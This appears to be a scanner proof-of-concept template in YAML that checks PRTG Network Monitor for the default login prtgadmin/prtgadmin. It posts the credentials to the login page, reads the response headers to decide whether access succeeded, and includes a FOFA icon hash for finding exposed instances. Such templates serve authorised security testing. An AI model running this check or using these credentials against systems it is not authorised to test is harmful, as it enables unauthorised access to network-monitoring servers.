id: poc-yaml-prtg-network-monitor-weak-password
info:
  name: PRTG 网络监视器 弱口令漏洞
  severity: high
  tags:
  - 弱口令
  finger: prtg_network_monitor
  fofa: icon_hash="-655683626"
requests:
- method: POST
  path: /public/checklogin.htm
  headers:
    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
  data: loginurl=&username=prtgadmin&password=prtgadmin
  expression: status_code == 302 && contains(headers,"Server\x3a PRTG") && contains(headers,"OCTOPUS")
    && contains(headers,"/home")
variables: {}
transport: http
